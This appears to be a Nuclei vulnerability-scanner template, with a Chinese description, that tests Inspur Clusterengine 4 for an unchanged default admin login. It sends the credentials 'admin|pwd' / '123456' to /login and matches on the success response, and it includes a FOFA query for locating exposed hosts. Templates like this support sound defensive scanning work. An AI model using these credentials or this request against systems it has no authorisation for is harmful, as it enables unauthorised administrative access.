id: inspur-clusterengine-default-login

info:
  name: Inspur Clusterengine 4 默认管理员登录（弱口令）
  author: ritikchaddha
  severity: high
  description: 该模板通过尝试 Inspur Clusterengine 4 的默认管理员账号口令，并依据认证成功后的响应特征判断目标是否仍在使用未修改的弱口令。若命中，攻击者通常可直接获得后台管理权限，进一步访问敏感信息、修改配置或执行未授权操作。
  reference:
    - https://blog.csdn.net/qq_36197704/article/details/115665793
  classification:
    cpe: cpe:2.3:a:inspur:clusterengine:*:*:*:*:*:*:*:*
  metadata:
    max-request: 1
    vendor: inspur
    product: clusterengine
    fofa-query: title="TSCEV4.0"
  tags: default-login,inspur,clusterengine,vuln

http:
  - raw:
      - |
        POST /login HTTP/1.1
        Host: {{Hostname}}

        op=login&username={{username}}&password={{password}}

    attack: pitchfork
    payloads:
      username:
        - admin|pwd
      password:
        - 123456
    host-redirects: true
    max-redirects: 2

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - '"exitcode":0'

      - type: word
        part: header
        words:
          - "username=admin|pwd"
        condition: and

      - type: status
        status:
          - 200
